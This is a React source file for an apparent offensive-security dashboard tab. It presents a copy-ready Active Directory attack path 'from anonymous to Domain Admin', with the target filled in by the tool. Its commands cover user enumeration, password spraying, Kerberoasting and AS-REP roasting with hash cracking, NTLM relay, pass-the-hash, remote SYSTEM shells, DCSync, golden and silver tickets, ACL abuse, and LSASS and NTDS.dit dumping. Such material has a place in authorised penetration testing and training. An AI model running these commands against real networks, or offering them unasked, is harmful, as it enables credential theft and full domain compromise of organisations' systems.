// @ts-nocheck
import { useState } from 'react'
import { useTargetCtx } from '../hooks/TargetContext'
import { useSupabaseData } from '../hooks/useSupabaseData'

const AD_SECTIONS = [
  {
    phase: '🔍 Enumeration',
    techniques: [
      { name: 'Find Domain Controllers', cmd: 'nslookup -type=srv _ldap._tcp.dc._msdcs.{TARGET_DOMAIN}', when: 'First step — identify DCs' },
      { name: 'Enumerate Users (Kerbrute)', cmd: 'kerbrute userenum --dc {TARGET_IP} -d {TARGET_DOMAIN} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt', when: 'No creds yet' },
      { name: 'Enumerate Users (RPC)', cmd: "rpcclient -U '' -N {TARGET_IP} -c 'enumdomusers'", when: 'Null session available' },
      { name: 'LDAP Anonymous Bind', cmd: 'ldapsearch -x -H ldap://{TARGET_IP} -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName', when: 'Port 389 open' },
      { name: 'SMB Shares (No Creds)', cmd: 'smbclient -N -L //{TARGET_IP}', when: 'Port 445 open' },
      { name: 'Enum4linux-ng', cmd: 'enum4linux-ng -A {TARGET_IP}', when: 'Quick full enumeration' },
    ]
  },
  {
    phase: '🔑 Credential Attacks',
    techniques: [
      { name: 'Password Spray', cmd: 'crackmapexec smb {TARGET_IP} -u users.txt -p "Welcome1!" --continue-on-success', when: 'Have username list' },
      { name: 'ASREPRoast', cmd: 'impacket-GetNPUsers {TARGET_DOMAIN}/ -usersfile users.txt -no-pass -dc-ip {TARGET_IP} -format hashcat', when: 'Find users with DONT_REQ_PREAUTH' },
      { name: 'Kerberoast', cmd: 'impacket-GetUserSPNs {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile kerberoast.txt', when: 'Have domain user creds' },
      { name: 'Crack Kerberoast', cmd: 'hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt', when: 'After Kerberoasting' },
      { name: 'Crack ASREPRoast', cmd: 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt', when: 'After ASREPRoasting' },
      { name: 'NTLM Relay (no SMB signing)', cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support', when: 'SMB signing disabled on targets' },
    ]
  },
  {
    phase: '🩸 BloodHound',
    techniques: [
      { name: 'Collect (Python)', cmd: 'bloodhound-python -u {USERNAME} -p {PASSWORD} -d {TARGET_DOMAIN} -ns {TARGET_IP} -c all', when: 'From Linux attack box' },
      { name: 'Collect (SharpHound)', cmd: '.\\SharpHound.exe -c all --zipfilename bh.zip', when: 'From compromised Windows host' },
      { name: 'Find Shortest Path to DA', cmd: 'MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p', when: 'In BloodHound GUI — Cypher query' },
      { name: 'Find Kerberoastable Admins', cmd: 'MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN u.name', when: 'High-value Kerberoast targets' },
      { name: 'Find AS-REP Roastable', cmd: "MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.description", when: 'Find easy wins' },
    ]
  },
  {
    phase: '↔️ Lateral Movement',
    techniques: [
      { name: 'Pass-the-Hash (CrackMapExec)', cmd: 'crackmapexec smb {TARGET_IP} -u {USERNAME} -H <NTLM_HASH> --local-auth', when: 'Have NTLM hash, no plaintext' },
      { name: 'Pass-the-Hash (Evil-WinRM)', cmd: 'evil-winrm -i {TARGET_IP} -u {USERNAME} -H <NTLM_HASH>', when: 'WinRM open (5985)' },
      { name: 'PSExec', cmd: 'impacket-psexec {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}', when: 'Have admin creds, need SYSTEM shell' },
      { name: 'WMIExec', cmd: 'impacket-wmiexec {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}', when: 'PSExec blocked, need semi-interactive shell' },
      { name: 'Overpass-the-Hash', cmd: 'impacket-getTGT {TARGET_DOMAIN}/{USERNAME} -hashes :<NTLM_HASH>\nexport KRB5CCNAME=username.ccache\nimpacket-psexec {TARGET_DOMAIN}/{USERNAME}@{TARGET_IP} -k -no-pass', when: 'Need Kerberos auth from NTLM hash' },
    ]
  },
  {
    phase: '👑 Domain Escalation',
    techniques: [
      { name: 'DCSync', cmd: 'impacket-secretsdump {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm', when: 'Have Replication rights or DA' },
      { name: 'Golden Ticket', cmd: "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain {TARGET_DOMAIN} Administrator\nexport KRB5CCNAME=Administrator.ccache", when: 'Have krbtgt hash — game over' },
      { name: 'Silver Ticket', cmd: 'impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain {TARGET_DOMAIN} -spn CIFS/{TARGET_IP} fakeuser', when: 'Have service account hash' },
      { name: 'Abuse GenericAll on User', cmd: 'net rpc password "TargetUser" "NewP@ss123" -U {TARGET_DOMAIN}/{USERNAME}%{PASSWORD} -S {TARGET_IP}', when: 'BloodHound shows GenericAll edge' },
      { name: 'Abuse WriteDACL', cmd: "impacket-dacledit {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -action write -rights DCSync -principal {USERNAME} -target-dn 'DC=corp,DC=local' -dc-ip {TARGET_IP}", when: 'WriteDACL on domain object' },
      { name: 'Resource-Based Constrained Delegation', cmd: "impacket-addcomputer {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -computer-name 'FAKE$' -computer-pass 'Fake1234'\nimpacket-rbcd {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip {TARGET_IP} -action write", when: 'GenericWrite on computer object' },
    ]
  },
  {
    phase: '📦 Post-Compromise',
    techniques: [
      { name: 'Dump All Hashes', cmd: 'impacket-secretsdump {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}', when: 'Domain Admin achieved' },
      { name: 'Dump LSASS (CrackMapExec)', cmd: 'crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} -M lsassy', when: 'Admin on target, extract creds from memory' },
      { name: 'Extract NTDS.dit', cmd: 'crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --ntds', when: 'On DC — dump all domain hashes' },
      { name: 'Find Domain Admin Sessions', cmd: 'crackmapexec smb targets.txt -u {USERNAME} -p {PASSWORD} --sessions', when: 'Hunt for DA tokens to steal' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  const copy = () => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500) }
  return <button className={`copy-btn ${copied ? 'copied' : ''}`} onClick={copy}>{copied ? '✓ COPIED' : 'COPY'}</button>
}

export default function ADTab() {
  const [openPhase, setOpenPhase] = useState(AD_SECTIONS[0].phase)
  const { inject } = useTargetCtx()

  // Merge new entries from Supabase
  const { data: dbRows } = useSupabaseData('ad_techniques', [])
  const staticNames = new Set(AD_SECTIONS.flatMap(s => s.techniques.map(t => t.name.toLowerCase())))
  const newFromDb = dbRows.filter(r => !staticNames.has((r.name || '').toLowerCase()))

  // Group new DB entries by phase
  const sections = [...AD_SECTIONS]
  for (const row of newFromDb) {
    const phase = row.phase || 'Enumeration'
    const existing = sections.find(s => s.phase.includes(phase))
    if (existing) {
      existing.techniques.push({ name: row.name, cmd: row.cmd, when: row.when_to_use || '' })
    }
  }

  return (
    <div style={{ padding: '0.5rem' }}>
      <div style={{ fontSize: '0.6rem', color: '#555', marginBottom: '1rem', borderLeft: '2px solid var(--neon)', paddingLeft: '0.75rem' }}>
        Active Directory attack path — from anonymous to Domain Admin. Set TARGET_IP, TARGET_DOMAIN, USERNAME, PASSWORD in the target bar above.
      </div>

      {AD_SECTIONS.map(section => {
        const isOpen = openPhase === section.phase
        return (
          <div key={section.phase} style={{ marginBottom: '0.5rem', border: '1px solid #111', background: '#050505' }}>
            <button onClick={() => setOpenPhase(isOpen ? '' : section.phase)} style={{
              width: '100%', display: 'flex', justifyContent: 'space-between', alignItems: 'center',
              padding: '0.6rem 0.75rem', background: 'none', border: 'none', cursor: 'pointer',
              color: isOpen ? 'var(--neon)' : '#ccc', fontFamily: 'inherit', fontSize: '0.8rem', fontWeight: 700,
            }}>
              <span>{section.phase}</span>
              <span style={{ fontSize: '0.6rem', color: '#555' }}>{section.techniques.length} techniques {isOpen ? '▼' : '▶'}</span>
            </button>
            {isOpen && (
              <div style={{ padding: '0 0.75rem 0.75rem', borderTop: '1px solid #0a0a0a' }}>
                {section.techniques.map(t => (
                  <div key={t.name} style={{ marginBottom: '0.75rem' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.25rem' }}>
                      <span style={{ fontSize: '0.72rem', color: '#ddd', fontWeight: 700 }}>{t.name}</span>
                      <span style={{ fontSize: '0.55rem', color: '#666', fontStyle: 'italic' }}>{t.when}</span>
                    </div>
                    <div className="cmd-block" style={{ position: 'relative' }}>
                      {inject(t.cmd).split('\n').map((line, i) => (
                        <div key={i}>
                          {line.startsWith('#') ? <span style={{ color: '#555' }}>{line}</span>
                            : <><span className="cmd-prompt">$ </span>
                              {line.split(/(\{[A-Z_]+\})/g).map((p, j) =>
                                /^\{[A-Z_]+\}$/.test(p) ? <span key={j} className="cmd-placeholder">{p}</span> : <span key={j}>{p}</span>
                              )}</>}
                        </div>
                      ))}
                      <CopyBtn text={inject(t.cmd)} />
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )
      })}
    </div>
  )
}
